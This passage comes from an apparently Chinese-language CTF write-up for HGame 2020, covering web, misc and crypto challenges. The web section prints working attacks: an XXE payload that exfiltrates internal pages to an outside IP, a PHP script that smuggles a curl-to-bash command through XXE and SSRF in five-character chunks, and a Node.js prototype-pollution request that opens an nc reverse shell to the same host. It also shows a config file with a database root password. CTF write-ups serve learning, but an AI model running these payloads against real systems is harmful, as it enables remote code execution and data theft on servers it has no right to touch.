class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>







<p>config.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dbms</span>=<span class="string">&#x27;mysql&#x27;</span>;</span><br><span class="line"><span class="variable">$host</span>=<span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"><span class="variable">$dbName</span>=<span class="string">&#x27;bdctr_message&#x27;</span>;</span><br><span class="line"><span class="variable">$user</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;yevi1gcqpqHSaOZVDI1CcRLaHHSJ5BYgImof&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dsn</span>=<span class="string">&quot;<span class="subst">$dbms</span>:host=<span class="subst">$host</span>;dbname=<span class="subst">$dbName</span>&quot;</span>;</span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> PDO(<span class="variable">$dsn</span>, <span class="variable">$user</span>, <span class="variable">$pass</span>, <span class="keyword">array</span>(PDO::ATTR_PERSISTENT =&gt; <span class="literal">true</span>));</span><br><span class="line"><span class="variable">$conn</span>-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>原本想着用gopher执行sql语句,但是有密码无法执行</p>
<p>我我我我是个dsb,明明知道可能是内网有可能由其他主机,但就是不试一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">IP address       HW type     Flags       HW address            Mask     Device</span><br><span class="line">172.21.0.5       0x1         0x0         00:00:00:00:00:00     *        eth0</span><br><span class="line">172.21.0.1       0x1         0x2         02:42:f7:6e:6f:34     *        eth0</span><br><span class="line">172.21.0.6       0x1         0x0         00:00:00:00:00:00     *        eth0</span><br><span class="line">172.21.0.2       0x1         0x0         00:00:00:00:00:00     *        eth0</span><br><span class="line">172.21.0.32      0x1         0x0         00:00:00:00:00:00     *        eth0</span><br><span class="line">172.21.0.75      0x1         0x0         00:00:00:00:00:00     *        eth0</span><br><span class="line">172.21.0.7       0x1         0x0         00:00:00:00:00:00     *        eth0</span><br><span class="line">172.21.0.76      0x1         0x2         02:42:ac:15:00:4c     *        eth0</span><br><span class="line">172.21.0.30      0x1         0x0         00:00:00:00:00:00     *        eth0</span><br><span class="line">172.21.0.77      0x1         0x0         00:00:00:00:00:00     *        eth0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1	localhost</span><br><span class="line">::1	localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0	ip6-localnet</span><br><span class="line">ff00::0	ip6-mcastprefix</span><br><span class="line">ff02::1	ip6-allnodes</span><br><span class="line">ff02::2	ip6-allrouters</span><br><span class="line">172.21.0.76	hgame-private</span><br><span class="line">172.21.0.31	f9f1b9b99e13</span><br></pre></td></tr></table></figure>

<p>发现一个内网服务器<code>172.21.0.76</code></p>
<p>当尝试访问80端口时,发现文件太大等一系列问题</p>
<blockquote>
<p>使用libxml读取文件时,文件不能太大否则会报错</p>
</blockquote>
<p>于是尝试压缩能不能读取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	error_reporting(0);</span><br><span class="line">	file_put_contents(&quot;tmp&quot;,base64_decode(str_replace(&#x27; &#x27;,&#x27;+&#x27;,$_GET[&#x27;a&#x27;])));</span><br><span class="line">	$a=file_get_contents(&quot;php://filter/read=zlib.inflate/resource=tmp&quot;);</span><br><span class="line">	file_put_contents(&quot;mes/&quot;.date(&quot;h_m_s&quot;).&quot;.txt&quot;,$a);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % data SYSTEM &quot;php://filter/zlib.deflate/convert.base64-encode/resource=http://172.21.0.76&quot;&gt;</span><br><span class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &#x27;http://39.108.164.219:60005/?a=%data;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$token</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$token</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;请带上您的队伍token访问! /?token=&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$api</span> = <span class="string">&quot;http://checker/?token=&quot;</span>.<span class="variable">$token</span>;</span><br><span class="line"><span class="variable">$t</span> = file_get_contents(<span class="variable">$api</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$t</span> !== <span class="string">&quot;ok&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;队伍token错误&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sandbox</span> = <span class="string">&#x27;/var/www/html/sandbox/&#x27;</span>. md5(<span class="string">&quot;hgame2020&quot;</span> . <span class="variable">$token</span>);;</span><br><span class="line">@mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">@chdir(<span class="variable">$sandbox</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$content</span>)) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = substr(<span class="variable">$content</span>,<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">    system(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>])) &#123;</span><br><span class="line">    system(<span class="string">&#x27;rm -rf ./*&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*   _____ _    _ ______ _      _        _____ ______ _______   _____ _______   _</span></span><br><span class="line"><span class="comment">  / ____| |  | |  ____| |    | |      / ____|  ____|__   __| |_   _|__   __| | |</span></span><br><span class="line"><span class="comment"> | (___ | |__| | |__  | |    | |     | |  __| |__     | |      | |    | |    | |</span></span><br><span class="line"><span class="comment">  \___ \|  __  |  __| | |    | |     | | |_ |  __|    | |      | |    | |    | |</span></span><br><span class="line"><span class="comment">  ____) | |  | | |____| |____| |____ | |__| | |____   | |     _| |_   | |    |_|</span></span><br><span class="line"><span class="comment"> |_____/|_|  |_|______|______|______( )_____|______|  |_|    |_____|  |_|    (_)</span></span><br><span class="line"><span class="comment">                                    |/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>



<p>然后利用 <a target="_blank" rel="noopener" href="https://err0rzz.github.io/2017/11/13/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/">https://err0rzz.github.io/2017/11/13/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/</a> </p>
<p>的方法来执行命令</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=file_get_contents(<span class="string">&quot;tmp.xml&quot;</span>);</span><br><span class="line">    <span class="variable">$command</span>=<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;&gt;ls\\\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;ls&gt;_&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;\\ \\\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;-t\\\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;\\&gt;g&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;ls&gt;&gt;_&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&gt;bash&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;\\|\\\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;5\\\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;00\\\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;60\\\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;9:\\\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;21\\\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;4.\\\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;16\\\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;8.\\\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;10\\\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;9.\\\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;3\\\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;\\ \\\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;rl\\\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;cu\\\\&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$command</span> <span class="keyword">as</span> <span class="variable">$v</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$v</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="variable">$v</span>=urlencode(<span class="variable">$v</span>);</span><br><span class="line">        file_put_contents(<span class="string">&quot;evil.xml&quot;</span>,str_replace(<span class="string">&quot;TGT&quot;</span>,<span class="variable">$v</span>,<span class="variable">$a</span>));</span><br><span class="line">        <span class="variable">$postdata</span>=<span class="string">&lt;&lt;&lt;MRK</span></span><br><span class="line"><span class="string">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE msg [</span></span><br><span class="line"><span class="string">&lt;!ELEMENT msg ANY &gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % sp SYSTEM &quot;http://39.108.164.219:60005/evil.xml&quot;&gt;</span></span><br><span class="line"><span class="string">%sp;</span></span><br><span class="line"><span class="string">%param1;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;msg&gt;&lt;id&gt;&amp;exfil;&lt;/id&gt;&lt;name&gt;b&lt;/name&gt;&lt;level&gt;c&lt;/level&gt;&lt;time&gt;d&lt;/time&gt;&lt;/msg&gt;</span></span><br><span class="line"><span class="string">MRK</span>;</span><br><span class="line">        <span class="variable">$opts</span> = <span class="keyword">array</span>(<span class="string">&#x27;http&#x27;</span> =&gt; </span><br><span class="line">        <span class="keyword">array</span>( <span class="string">&#x27;method&#x27;</span>  =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;header&#x27;</span>  =&gt; <span class="string">&#x27;Content-type: application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;content&#x27;</span> =&gt; <span class="variable">$postdata</span> ) </span><br><span class="line">    );</span><br><span class="line">        <span class="variable">$context</span> = stream_context_create(<span class="variable">$opts</span>);</span><br><span class="line">        file_get_contents(<span class="string">&quot;http://bdctr.hgame.day-day.work/submit.php&quot;</span>, <span class="literal">false</span>, <span class="variable">$context</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>在经历一次rm -rf 之后,终于拿到getshell</p>
<p><img src="https://i.loli.net/2020/02/17/IDFPmldJKNhEHt7.png" alt="image26112"></p>
<p><code>hgame&#123;XxE!@SsrF_4nD_f1lt3rEd_Rc3_1s_Co0l!&#125;</code></p>
<h3 id="sekiro"><a href="#sekiro" class="headerlink" title="sekiro"></a>sekiro</h3><p>刚拿到题目的时候,我心态被第一题搞崩了,随便看了一下,就溜去打游戏了,看了wp,艹</p>
<p>拿到题目,是我不熟悉的nodejs</p>
<p>影响不大,看个大概就会了</p>
<p><code>\route\index.js</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/action&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.session.sekiro) &#123;</span><br><span class="line">    res.end(<span class="string">&quot;Session required.&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!req.session.sekiro.alive) &#123;</span><br><span class="line">    res.end(<span class="string">&quot;You dead.&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> body = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(req.body));<span class="comment">//原型链污染起点</span></span><br><span class="line">  <span class="keyword">var</span> copybody = clone(body)</span><br><span class="line">  <span class="keyword">if</span> (copybody.solution) &#123;</span><br><span class="line">    req.session.sekiro = Game.dealWithAttacks(req.session.sekiro, copybody.solution)</span><br><span class="line">  &#125;</span><br><span class="line">  res.end(<span class="string">&quot;提交成功&quot;</span>+<span class="built_in">JSON</span>.stringify(req.body))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<p>在注释处有一个奇怪的操作,转成json再转成解析成obj</p>
<p>这摆明了有问题,遇到<code>JSON.parse+merge</code> ,思路可以往原型链污染上走一走</p>
<p>我们继续阅读代码</p>
<p>跟进dealWithAttacks</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.dealWithAttacks = <span class="function"><span class="keyword">function</span> (<span class="params">sekiro, solution</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (sekiro.attackInfo.solution !== solution) &#123;</span><br><span class="line">            sekiro.health -= sekiro.attackInfo.attack</span><br><span class="line">            <span class="keyword">if</span> (sekiro.attackInfo.additionalEffect) &#123;</span><br><span class="line">                <span class="keyword">var</span> fn = <span class="built_in">Function</span>(<span class="string">&quot;sekiro&quot;</span>, sekiro.attackInfo.additionalEffect + <span class="string">&quot;\nreturn sekiro&quot;</span>)</span><br><span class="line">                sekiro = fn(sekiro)<span class="comment">//look this</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sekiro.posture = (sekiro.posture &lt;= <span class="number">500</span>) ? sekiro.posture : <span class="number">500</span></span><br><span class="line">        sekiro.health = (sekiro.health &gt; <span class="number">0</span>) ? sekiro.health : <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> (sekiro.posture == <span class="number">500</span> || sekiro.health == <span class="number">0</span>) &#123;</span><br><span class="line">            sekiro.alive = <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sekiro</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fn = <span class="built_in">Function</span>(<span class="string">&quot;sekiro&quot;</span>, sekiro.attackInfo.additionalEffect + <span class="string">&quot;\nreturn sekiro&quot;</span>)</span><br><span class="line">                sekiro = fn(sekiro)</span><br></pre></td></tr></table></figure>

<p>明显的代码执行,如果我们能控制<code>sekiro.attackInfo.additionalEffect</code>,那么便可以执行任意代码了</p>
<p>我们看一下<code>sekiro.attackInfo.additionalEffect </code>是如何获得的</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.attacks = [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;method&quot;</span>: <span class="string">&quot;连续砍击&quot;</span>,</span><br><span class="line">            <span class="string">&quot;attack&quot;</span>: <span class="number">1000</span>,</span><br><span class="line">            <span class="string">&quot;additionalEffect&quot;</span>: <span class="string">&quot;sekiro.posture+=100&quot;</span>,</span><br><span class="line">            <span class="string">&quot;solution&quot;</span>: <span class="string">&quot;连续格挡&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;method&quot;</span>: <span class="string">&quot;普通攻击&quot;</span>,</span><br><span class="line">            <span class="string">&quot;attack&quot;</span>: <span class="number">500</span>,</span><br><span class="line">            <span class="string">&quot;additionalEffect&quot;</span>: <span class="string">&quot;sekiro.posture+=50&quot;</span>,</span><br><span class="line">            <span class="string">&quot;solution&quot;</span>: <span class="string">&quot;格挡&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;method&quot;</span>: <span class="string">&quot;下段攻击&quot;</span>,</span><br><span class="line">            <span class="string">&quot;attack&quot;</span>: <span class="number">1000</span>,</span><br><span class="line">            <span class="string">&quot;solution&quot;</span>: <span class="string">&quot;跳跃踩头&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;method&quot;</span>: <span class="string">&quot;突刺攻击&quot;</span>,</span><br><span class="line">            <span class="string">&quot;attack&quot;</span>: <span class="number">1000</span>,</span><br><span class="line">            <span class="string">&quot;solution&quot;</span>: <span class="string">&quot;识破&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;method&quot;</span>: <span class="string">&quot;巴之雷&quot;</span>,</span><br><span class="line">            <span class="string">&quot;attack&quot;</span>: <span class="number">1000</span>,</span><br><span class="line">            <span class="string">&quot;solution&quot;</span>: <span class="string">&quot;雷反&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">    ]</span><br><span class="line">    <span class="built_in">this</span>.getAttackInfo = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.attacks[<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="built_in">this</span>.attacks.length)]</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>是从<code>attacks</code>中随机挑一个拿出来的,而其中某些是没有<code>additionalEffect</code>属性的</p>
<p>根据js根据原型链来查找属性的特性</p>
<p>我们可以用原型链污染来修改Object的additionalEffect属性</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /action HTTP/1.1</span><br><span class="line">Host: sekiro.hgame.babelfish.ink</span><br><span class="line">Content-Length: 169</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Accept: */*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36</span><br><span class="line">Content-Type: application/json; charset=UTF-8</span><br><span class="line">Referer: http://sekiro.hgame.babelfish.ink/</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Cookie: session=s%3A1PZpvTS3HgeMcmNynPUdu4Yd8B4A7Rlt.c2nTB%2F99oXNjyJljMJ0HZugi0SJnsE4juq2ZboRTH0g</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;solution&quot;:123,&quot;__proto__&quot;:&#123;&quot;additionalEffect&quot;:&quot;global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;nc 39.108.164.219 60000 -e /bin/sh&#x27;,function()&#123;&#125;);&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>content-type要设置成<code>Content-Type: application/json</code></p>
<p>不然<code>__proto__</code>是无法当初键的,那么merge也就没用了</p>
<p><code>hgame&#123;j@v4scr1pt_pr0t0tYp3-poLLut1on_4tt4ck_1s_d@ng3r20us&#125;</code></p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="欢迎参加HGame！"><a href="#欢迎参加HGame！" class="headerlink" title="欢迎参加HGame！"></a>欢迎参加HGame！</h3><p> <a target="_blank" rel="noopener" href="http://rumkin.com/tools/cipher/morse.php">http://rumkin.com/tools/cipher/morse.php</a> </p>
<h3 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h3><p>就说说咋拿到密码的</p>
<p>压缩文件提示<code>End of Zip archive, comment: &quot;Password is picture ID.&quot;</code></p>
<p>利用搜索引擎(<code>Pixiv@純白可憐</code>)拿到密码</p>
<h3 id="克苏鲁神话"><a href="#克苏鲁神话" class="headerlink" title="克苏鲁神话"></a>克苏鲁神话</h3><p>解压得到一个文本和一个压缩包</p>
<p>观察文本和压缩包发现,二者的CRC值相同,于是考虑用明文攻击(不好意思,我是看着wiki遍历过去的)</p>
<p>然后拿到里面的word文档,但是是加密的,猝.</p>
<p>在看一下那个文本,有点像培根密码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&quot;of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd.&quot;</span>.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s),<span class="number">5</span>):</span><br><span class="line">    temp=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">if</span> s[i+j]==s[i+j].lower():</span><br><span class="line">            temp+=<span class="string">&quot;0&quot;</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            temp+=<span class="string">&quot;1&quot;</span></span><br><span class="line">    result+=<span class="built_in">chr</span>(<span class="built_in">int</span>(temp,<span class="number">2</span>)+<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>于是拿到密码(HIDDENINTHEDOC),但是还没到头!!!!!百度一下word隐写,最后拿到flag</p>
<h3 id="签到题ProPlus"><a href="#签到题ProPlus" class="headerlink" title="签到题ProPlus"></a>签到题ProPlus</h3><p>解压得到password.txt和ok.zip</p>
<p>根据password.txt的提示,栅栏解密+凯撒密码得到压缩包密码.</p>
<p>拿到一堆ook直接上谷歌.ok了</p>
<p>base32-&gt;base64-&gt;二维码</p>
<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="InfantRSA"><a href="#InfantRSA" class="headerlink" title="InfantRSA"></a>InfantRSA</h3><p>直接套脚本</p>
<h3 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> A, B, flag</span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&#x27;hgame&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">TABLE = <span 